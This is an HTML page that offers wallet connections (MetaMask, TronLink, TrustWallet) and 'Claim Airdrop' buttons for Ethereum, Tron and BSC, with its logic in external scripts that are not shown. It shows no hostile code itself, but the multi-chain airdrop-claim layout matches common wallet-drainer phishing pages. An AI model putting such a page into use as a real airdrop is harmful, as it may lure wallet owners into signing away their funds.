<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Integration</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <h1>Connect your Wallet</h1>
    <button id="connectButton">Connect MetaMask</button>
    <button id="claimAirdropButton" disabled>Claim Airdrop (ETH)</button>
    <button id="connectTronlinkButton">Connect TronLink</button>
    <button id="claimTronAirdropButton" disabled>Claim Airdrop (TRON)</button>
    <button id="connectTrustwalletButton">Connect TrustWallet</button>
    <button id="claimTrustwalletAirdropButton" disabled>Claim Airdrop (BSC)</button>

    <script src="js/common.js"></script>
    <script src="js/metamask.js"></script>
    <script src="deeplinks/metamask-deep.js"></script>
    <script src="js/loader.js"></script>
    <script src="js/eth.js"></script>
    <script src="js/bsc.js"></script>
    <script src="js/tron.js"></script>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            document.getElementById('connectButton').addEventListener('click', function() {
                loadConfigAndABI('eth');  // Load config and ABI for Ethereum
                connectMetaMask();        // Then call MetaMask connection logic
            });

            document.getElementById('connectTronlinkButton').addEventListener('click', function() {
                loadConfigAndABI('tron');  // Load config and ABI for Tron
                connectTronLink();         // Then call TronLink connection logic
            });

            document.getElementById('connectTrustwalletButton').addEventListener('click', function() {
                loadConfigAndABI('bsc');  // Load config and ABI for BSC
                connectTrustWallet();     // Then call TrustWallet connection logic
            });
        });
    </script>
</body>
</html>
